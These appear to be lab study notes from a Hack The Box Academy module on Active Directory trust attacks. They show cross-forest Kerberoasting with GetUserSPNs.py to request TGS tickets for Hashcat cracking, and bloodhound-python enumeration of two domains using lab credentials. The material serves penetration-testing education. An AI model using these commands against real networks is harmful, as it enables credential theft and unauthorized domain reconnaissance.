## Cross-Forest Kerberoasting

#### Using GetUserSPNs.py

	AstraX01@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

Rerunning the command with the `-request` flag added gives us the TGS ticket.We could also add `-outputfile <OUTPUT FILE>` to output directly into a file

#### Using the -request Flag

	AstraX01@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

We could then attempt to crack this offline using Hashcat with mode `13100`.


---
## Hunting Foreign Group Membership with Bloodhound-python

#### Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf

	AstraX01@htb[/htb]$ cat /etc/resolv.conf

	#nameserver 1.1.1.1 
	#nameserver 8.8.8.8 
	domain INLANEFREIGHT.LOCAL 
	nameserver 172.16.5.5

#### Running bloodhound-python Against INLANEFREIGHT.LOCAL

	AstraX01@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

#### Compressing the File with zip -r

	AstraX01@htb[/htb]$ zip -r ilfreight_bh.zip *.json

We will repeat the same process, this time filling in the details for the `FREIGHTLOGISTICS.LOCAL` domain.

---

#### Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf

	AstraX01@htb[/htb]$ cat /etc/resolv.conf

	#nameserver 1.1.1.1 
	#nameserver 8.8.8.8 
	domain FREIGHTLOGISTICS.LOCAL 
	nameserver 172.16.5.238

#### Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL

	AstraX01@htb[/htb]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2